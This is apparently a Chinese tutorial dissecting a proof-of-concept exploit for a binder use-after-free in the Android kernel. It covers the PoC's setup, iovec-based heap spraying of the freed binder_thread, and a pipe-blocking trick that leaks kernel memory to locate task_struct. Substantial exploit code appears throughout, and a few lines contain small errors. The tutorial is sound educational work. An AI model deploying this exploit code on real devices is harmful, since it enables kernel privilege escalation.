
```c
dummy_page = mmap((void *)0x100000000ul, 2 * PAGE_SIZE,
                  PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
if (dummy_page != (void *)0x100000000ul)
    err(1, "mmap 4g aligned");
if (pipe(kernel_rw_pipe))
    err(1, "kernel_rw_pipe");
binder_fd = open("/dev/binder", O_RDONLY);
epoll_fd = epoll_create(1000);
}
```

通过`getpid()`获取当前进程的PID后，将其作为参数输入`uname`函数，并把读出来的信息放到`kernel_info`这个传出参数里。`uname`是一个获取系统信息的函数，我们经常用`uname -r`命令查看操作系统的内核版本，这里他会从`kernel_info`读出系统的内核额版本并判断是否是`4.4.177-g83bee1dc48e8`。

然后用`mmap`映射两个页大小的内存到在`0x100000000ul`这个地址去，`ul`表示是无符号长型，避免了z最高位被错误当作符号位来解析。为什么往`0x100000000`这个地方映射不往别地？这个数值是非常特殊的，以后会作为信息泄漏的关键，这里简单提下，关键特征是低四字节为0，用它来占位了UAF对象的自旋锁字段可以绕过自旋锁的校验，在后面会讲到，反正现在就知道这数是精心构造就行。至于为什么是两个页，

还有一点需要注意，`0x100000000ul`表示的是4GB，这个值是个“线索”，实际映射地址是他的整数倍，即实际的地址是4GB对齐的,虽然我就想让他映射到这，但是要注意不是说我想这么做就一定会成功，他也许还映射到`0x200000000`呢，所以还需要`if (dummy_page != (void *)0x100000000ul)`做个检查。

最后创建管道，`binder_fd`和`epoll`的文件描述符。这个管道和我们一会用来做信息泄露用到的管道是两码事，这只是个普通的文件，而那个管道用法就非常骚气，一会再说。`binder_fd`和`epoll_fd`都是初始化，注意`epoll_fd = epoll_create(1000)`不等于最多就能接受1000个文件句柄，这个我会详细说

# 内核信息泄漏：`find_current`

这一步是利用漏洞泄漏出`task_struct`结构体的内存地址。`task_struct`是用于描述整个进程的，这个结构体超级大，他就相当于是Windows下的`EPROCESS`结构体，重要性可见一斑。

我会仔细分析每一段代码的含义，先从`find_current`开头，初始化`epoll`开始

```c
epoll_fd = epoll_create(1000);

struct epoll_event event = {.events = EPOLLIN};

if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &event))
    err(1, "epoll_add");
```

`epoll`是啥？关于`epoll`简单科普下。IO多路复用中最常用的是`select`，`poll`，`epoll`三个函数族，redis，ngix等大名鼎鼎的框架之所以能有极高的并发处理能力离不开对`epoll`的使用。这三族函数的作用，都是监听文件里有没有数据的，如果有数据就返回，否则就一直阻塞（但可以设置阻塞/非阻塞，以及超时时间）。

`epoll_ctl`需要四个参数，一个`epoll_fd`，由`epoll_create(1000)`创建，用来代表所有被监控文件的描述符的集合，这里1000可以随便填，并不是最大能监听的文件描述符数量。第二个参数是驱动的命令字，比如`EPOLL_CTL_ADD`就是把`binder_fd`添加进监听序列。第三个参数被监听文件的描述符。最后一个是`event`，这个相当于一个“配置文件”，其中的`event`字段记录了要监听的事件类型，比如这里设置`.events = EPOLLIN`就表示监听写入`binder_fd`文件的写入事件。总之是添加被监听的文件和监听事件的类型

还有一个重要的函数是`epoll_wait`（POC里没用到）简单说下：比如我设置了监听文件的写入事件，而被监听的文件共有10个,如果有三个被写进去数据了，那么他就返回3,而且返回后只需处理被监听数组前3个元素即可，因为这些文件描述符已经被重新排序，监听到被写入事件的文件描述符将被放到数组最前面

但是上述结论是`epoll`处理socket文件的情景，处理`binder`用的是别的内核函数，所以一定会有些差异，比如内核里处理socket是使用一棵监听红黑树管理文件描述符，但处理`binder`时使用的是一个等待链表。但差别不会很大。对源代码层面的解读详见版主大大的文章 https://bbs.pediy.com/thread-264932.htm

但是写完后我感到对漏洞的分析没多大帮助，其实这几行代码只起了两个关键作用 1.在内核中创建`binder`相关的数据结构，2.把这个数据结构链入`epoll`的等待链表`wait_queue`里。为什么还要写呢?因为不写精力就白费了:)

接下来这部分就很神奇了，关于UAF类漏洞一个比较通用的利用方法：`iovec`方法，是POC的核心技术.因为没有官方说法所以姑且这么叫，这是腾讯Keen实验室的大神研究员 Di Shen 在 <mark class="encrypted">1b0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2&6L8%4g2@1N6h3u0W2i4K6u0W2j5$3!0E0i4K6u0r3N6$3q4@1j5$3S2Q4x3@1k6$3i4K6y4p5g2e0u0I4N6V1D9I4K9p5Z5$3P5X3N6Q4x3U0k6@1i4K6y4p5x3e0j5I4z5s2x3`.</mark> 里公布的攻击方法。下面这几行代码包含的信息量是巨大的：

```c
binder_iovecs bio;

memset(&bio, 0, sizeof(bio));

bio.iovs[iov_idx].iov_base = dummy_page; /* spinlock in the low address half must be zero */
bio.iovs[iov_idx].iov_len = PAGE_SIZE; /* wq->task_list->next */
bio.iovs[iov_idx + 1].iov_base = (void *)0xdeadbeef; /* wq->task_list->prev */
bio.iovs[iov_idx + 1].iov_len = PAGE_SIZE;
```

先解释下向量化IO：它属于linux的高级IO，即可以一次性的从多个缓冲区读出数据并写入到数据流，又能数据流读出数据一次性写入多个缓冲区，而上述操作都只经过一次系统调用因此大大缩小了系统的开销。应用场景如，我拿到了一个http数据包，我想把包里的请求行，请求头，请求体分别放到`buf1`，`buf2`，`buf3`，用这个就能一步到位，高效处理网络流量。而POC里设置了基址是`dummy_page`，大小是`PAGE_SIZE`和基址是`(void *)0xdeadbeef`，大小是`PAGE_SIZE`两个有效的`iovec`结构体，其余没用,都是基址是0大小也是0

![](upload/attach/202102/803510_RV46Q3N2FJ398NU.png)

为什么要设置`binder_iovecs`呢，他存在的意义是啥？他的作用是占位UAF对象`binder_thread`。当释放`binder_thread`时迅速用事先精心构造好的一个结构去占位，是UAF漏洞常用的利用方法。然后执行`do_exit`的`remove_wait_queue`就会发生些奇妙的事，后面讲到

那如何确定占位内存块的大小呢？为什么`binder_iovecs bio`被设置成512个字节，明明`binder_thread`没这么大啊？我们回看崩溃现场，里面有这么一句话：

```text
The buggy address belongs to the object at ffff8801cd8e1340 which belongs to the cache kmalloc-512 of size 512
The buggy address is located 176 bytes inside of 512-byte region [ffff8801cd8e1340, ffff8801cd8e1540)
```

内核对象`binder_thread`需要的内存是slab分配器分配，内存被释放后内存被链接回到`kmalloc-512`里。说明我们需要构造512个字节的结构体来占位

那为什么不用其他数据结构填充，比如都是一堆char呢，颗粒度够细绝对能模拟全部的数据结构，非要用这个`iovec`呢。原因在于，

第一，我们只能在三环创建数据结构，O环真的把这个结构拷贝进内核了吗，没有是不占用内核内存的，没法起到替换/占位的作用。

第二 即便拷贝进去了，能不能能利用结构体关联的函数/机制做进一步的利用呢。`iovec`结构体背后的机制，就是所谓向量化I/O就非常适合，它有4方面优势

1.由于`binder_iovecs`是由多个`iovec` 组成的`iovec` 数组，数组长度是由攻击者控制的，通过调节数组长度就能得到想要的大小了。

2.两个成员变量里有一个是指针，并且可以从这个指针里读/写数据

3.这个结体足够小，因为`AARCH64`架构一般是8字节的内存对齐，所以可以近似把大部分内核对象的大小都视为8字节的整数倍，由于`ARM64`下单个`iovec`只有16字节，几乎可以用它占位所有的UAF对象了，是64为OS下一个比较通用的UAF漏洞利用方案。`iovec`结构体如下

   ```c
   struct iovec { // Size: 0x10
       void *iov_base; // 0x00
       size_t iov_len; // 0x08
   }
   ```

4.`iovec`数组会被全部拷贝到内核，可以用来占用内核内存的

那为什么从下标`iov_idx`开始的`iovec`结构体是有效的，为什么不是从第4个，或者第7个开始有效？因为`bio.iovs[iov_idx]`相对于`bio.iovs[0]`的偏移，就是`wait_queue_head_t wait`相对于UAF对象`binder_thread`的偏移，我改写`bio.iovs[iov_idx]`这个字段就相当与改写了`binder_thread`里的`wait`字段。巧妙吧，两者重叠了

还有一个问题,那为什么要给POC中`iovec`设置了两个如此奇怪的内存区域，一个是从`dummy_page`开始，大小是`PAGE_SIZE`，以及从`0xdeadbeef`开始大小为`PAGE_SIZE`。`dummy_page`之前已经确认是`0x100000000ul`了，那`0xdeadbeef`是啥，死牛肉？这虽然是一个合法的二进制数但肯定不是一个合法的内存地址。说明这个数，应该目前只是一个占位符，只是为了能编译通过，后面肯定会被漏洞程序在运行时改写成一个合法的地址。那咋改写的？改写成啥了呢？接着看后面的代码

```c
int pipe_fd[2];

if (pipe(pipe_fd))
    err(1, "pipe");

if (fcntl(pipe_fd[0], F_SETPIPE_SZ, PAGE_SIZE) != PAGE_SIZE)
    err(1, "pipe size");

static char page_buffer[PAGE_SIZE];

pid = fork();

if (pid == -1)
    err(1, "fork");

if (pid == 0) {
    /* Child process */
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    sleep(2);
    epoll_ctl(epoll_fd, EPOLL_CTL_DEL, binder_fd, &event);
    // first page: dummy data.it's read,not readv
    printf("child:read begin\n");
    if (read(pipe_fd[0], page_buffer, PAGE_SIZE) != PAGE_SIZE)
        err(1, "read full pipe");
    printf("child:read finish\n");
    printf("page buff1 %s\n");
    close(pipe_fd[1]);
    exit(0);
}

ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
printf("father:writev begin\n");
ssize_t writev_ret = writev(pipe_fd[1], bio.iovs, iovs_sz);
printf("father:writev endn");

if (writev_ret != (ssize_t)(2 * PAGE_SIZE))
    errx(1, "writev() returns 0x%lx, expected 0x%lx\n",
         writev_ret, (ssize_t)(2 * PAGE_SIZE));

// second page: leaked data
printf("father:read begin\n");
if (read(pipe_fd[0], page_buffer, PAGE_SIZE) != PAGE_SIZE)
    printf("father:read finish\n");
err(1, "read full pipe");
printf("page buff2 %s\n");

pid_t status;
if (wait(&status) != pid)
    err(1, "wait");
```

这段代码涉及到的知识点比上面那几行还要多的多。我把它拆成两个部分，详细解释内核信息是如何被巧妙的泄漏出去的

## 内核信息泄漏之1 阻塞的原因及解除

阻塞的巧妙运用正是实现内核堆喷射的精髓所在

```c
int pipe_fd[2];

if (pipe(pipe_fd))
    err(1, "pipe");

if (fcntl(pipe_fd[0], F_SETPIPE_SZ, PAGE_SIZE) != PAGE_SIZE)
    err(1, "pipe size");

static char page_buffer[PAGE_SIZE];
```

先解释管道通信。linux下进程间通信方式有多种，如管道，socket，信号，共享内存，文件等等。管道通信是半双工的，他会首先创建一个对pipe：`int pipe_fd[2]`，用`pipe(pipe_fd)`函数把他俩绑定起来。其中`pipe[0]`是读端，`pipe[1]`是写端，只能往`pipe[0]`读数据，另一端写数据，反过来不行，因为这个不是全双工的通信。但是socket对可以。另外管道是读阻塞的，意味着如果不往里写数据，读操作会一直卡住。`fcntl(pipe_fd[0], F_SETPIPE_SZ, PAGE_SIZE)`用来设置管道的大小为一个页大小，linux 2.6.11前管道默认是一个页大小，之后默认是16个页，只需对`pipe_fd[0]`读端设置，写端无需设置，该设置至关重要，后面会讲

```c
pid = fork();

...

if (pid == 0) {

prctl(PR_SET_PDEATHSIG, SIGKILL);

sleep(2);

...

}
```

用`pid = fork()`创建子进程后，子进程从`prctl(PR_SET_PDEATHSIG, SIGKILL)`继续执行，`prctl`表示父进程一旦退出则发送`SIGKILL`信号给子进程让子进程也退出并自动回收子进程资源。接着子进程执行`sleep(2)`进入休眠。这个休眠时间很长，长到父进程一定会执行到结尾，或者直到发生阻塞，子进程才会继续执行。如果子进程想等到父进程运行到退出，由于调用过`prctl`，父进程一旦退出后子进程也得退出那么`sleep`后面的代码也没机会执行了，显然不合理，但故只能是父进程运行到阻塞一种情况。可以通过插入`printf`打印下日志看看日志打印的先后顺序来验证这个判断。

```c
ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
ssize_t writev_ret = writev(pipe_fd[1], bio.iovs, iovs_sz);
```

那阻塞在哪呢？阻塞在父进程的`ssize_t writev_ret = writev(pipe_fd[1], bio.iovs, iovs_sz)` 这句话意思是从`dummy_page`里读出`PAGE_SIZE`字节的内容，从`0xdeadbeef`里也读出`PAGE_SIZE`的内容，之后把读到的写入管道写端`pipe_fd[1]`。这就很奇怪了。`writev`函数本身是非阻塞的，但为什么会阻塞呢

虽然`writev`函数是非阻塞的，但管道是读阻塞的。我们之前置了管道的大小是一个页，所以光是从`dummy_page`就读了一个页的内容出来并写到管道，就已经把这个管道写满了，所以再试图向管道写数据，无论第二个`iovec`里的基地址`0xdeadbeef`有没有被替换为合法地址，都会阻塞，想解除阻塞必须先把管道的数据都读出来

解除阻塞的读操作肯定是发生在子进程的，因为父进程已经动弹不得了。子进程的`read`操作

```c
if (read(pipe_fd[0], page_buffer, PAGE_SIZE) != PAGE_SIZE) /* child read */
```

把管道一个页的内容读出来后，管道随即被清空，`writev`马上从下一个`iovec`即

```c
bio.iovs[iov_idx + 1].iov_base = (void *)0xdeadbeef; /* wq->task_list->prev */
bio.iovs[iov_idx + 1].iov_len = PAGE_SIZE;
```
